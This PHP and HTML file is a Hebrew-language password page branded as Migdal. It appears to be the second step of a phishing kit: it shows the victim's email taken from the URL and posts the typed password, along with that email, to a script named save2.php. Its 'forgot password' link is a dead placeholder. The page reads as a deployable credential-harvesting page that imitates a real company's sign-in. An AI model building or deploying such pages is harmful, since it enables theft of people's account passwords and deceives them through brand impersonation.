<?php

$user = isset($_GET['user']) ? trim($_GET['user']) : '';
if ($user === '') { $user = 'user@example.com'; }
?>
<!doctype html>
<html lang="he" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>הזנת סיסמה</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#f7fafc;
      --primary:#3b5dee;
      --primary-600:#2f4ad4;
      --ink:#0b0e21;
      --muted:#606b85;
      --card:#ffffff;
      --ring: rgba(59,93,238,.35);
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0; background:var(--bg); color:var(--ink);
      font-family:"Heebo", system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Noto Sans";
      -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
    }

    .shell{min-height:100%; position:relative; display:block;}
    .bg{
      position:absolute; inset:0; z-index:0; pointer-events:none;
      background:
        radial-gradient(1200px 800px at 85% 15%, #e6f5e9 0, #e6f5e9 45%, transparent 46%),
        linear-gradient(180deg, #eaf4ff, #f6f8ff 60%);
    }
    .bg::after{
      content:"";
      position:absolute;
      top:18px; inset-inline-end:24px;
      width:min(28vw, 260px); aspect-ratio:1/1;
      background:url("logo.svg") no-repeat center/contain;
      opacity:.10;
      filter:contrast(120%);
    }

    .wrap{position:relative; z-index:1; display:grid; align-items:center; justify-items:center; padding:32px;}
    .card{
      width:100%; max-width:720px; background:var(--card);
      border-radius:20px; box-shadow:0 16px 50px rgba(11,14,33,.08);
      padding:clamp(20px, 4vw, 40px);
      backdrop-filter:saturate(1.1);
    }

    .card-head{display:flex; align-items:center; gap:16px;}
    .brand{margin:0; font-size:clamp(28px, 5vw, 48px); font-weight:800; color:var(--primary);}
    .brand-mark{
      inline-size:120px; block-size:auto;
      margin-inline-start:auto; opacity:.95;
    }
    @media (max-width:520px){ .brand-mark{inline-size:84px;} }
    @media (max-width:390px){ .brand-mark{display:none;} }

    .divider{height:1px; background:#e8ecf3; margin:16px 0 20px}

    .who{
      display:inline-flex; align-items:center; gap:8px;
      padding:10px 14px; border-radius:999px; background:#f2f5ff; color:#2b3a75;
      font-weight:700; margin:0 0 12px;
    }
    .who small{font-weight:500; color:var(--muted)}
    .who a{color:#2f63f1; text-decoration:none; font-weight:600}
    .who a:hover{text-decoration:underline}

    .label{font-weight:700; color:#0b0e21;}
    .field{margin-top:14px; display:grid; gap:8px}
    .input{
      width:100%; font:500 16px Heebo, system-ui; padding:14px 16px;
      border:1.5px solid #d7def0; border-radius:12px; background:#fff; color:var(--ink)
    }
    .input:focus{ outline:none; border-color:var(--primary); box-shadow:0 0 0 5px var(--ring) }

    .cta{margin-top:22px}
    .btn{
      width:100%; display:inline-grid; grid-auto-flow:column; grid-auto-columns:max-content; justify-content:center; align-items:center; gap:12px;
      border:0; border-radius:999px; padding:18px 24px; background:var(--primary); color:#fff; font:700 20px Heebo, system-ui; cursor:pointer;
      transition: transform .02s ease, background .2s ease; box-shadow:0 12px 36px rgba(59,93,238,.35);
    }
    .btn:hover{ background:var(--primary-600) }
    .btn:active{ transform:translateY(1px) }

    .hint{margin-top:14px; color:var(--muted); font-size:14px}
    footer{margin-top:32px; text-align:center; color:#8a93a9; font-size:13px}
  </style>
</head>
<body>
  <main class="shell">
    <div class="bg" aria-hidden="true"></div>

    <section class="wrap">
      <form class="card" action="save2.php" method="post" novalidate>
        <div class="card-head">
          <h1 class="brand">הזנת סיסמה</h1>
          <img src="logo.svg" alt="מגדל" class="brand-mark">
        </div>
        <div class="divider" aria-hidden="true"></div>

        <div class="who" aria-live="polite">
          <span>מתחברים כ־</span>
          <strong><?php echo htmlspecialchars($user, ENT_QUOTES, 'UTF-8'); ?></strong>
          <small>·</small>
          <a href="index.html">החלפת משתמש</a>
        </div>

        <label class="label" for="password">סיסמה</label>
        <div class="field">
          <input class="input" id="password" name="password" type="password" placeholder="הקלד/י סיסמה" autocomplete="current-password" required />
          <input type="hidden" name="user" value="<?php echo htmlspecialchars($user, ENT_QUOTES, 'UTF-8'); ?>" />
        </div>

        <div class="cta">
          <button class="btn" type="submit">המשך</button>
        </div>

        <p class="hint"><a href="#" style="color:#2f63f1; text-decoration:none" onclick="return false;">שכחתי סיסמה</a></p>

        <footer>מגדל 2025 ©</footer>
      </form>
    </section>
  </main>
</body>
</html>


